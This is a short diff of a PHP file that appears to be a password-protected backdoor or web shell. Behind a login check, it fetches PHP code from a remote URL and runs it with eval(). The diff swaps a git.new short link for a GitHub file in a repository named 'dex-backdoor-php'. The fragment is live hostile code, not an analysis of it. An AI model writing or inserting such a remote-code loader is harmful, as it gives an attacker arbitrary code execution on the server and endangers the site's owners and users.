@@ -57,7 +57,7 @@ if (isset($_POST['DEX'])) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-    $a = geturlsinfo('https://git.new/main-dexx');
+    $a = geturlsinfo('https://github.com/nugraharevi045-arch/dex-backdoor-php/blob/main/main-dex.txt');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
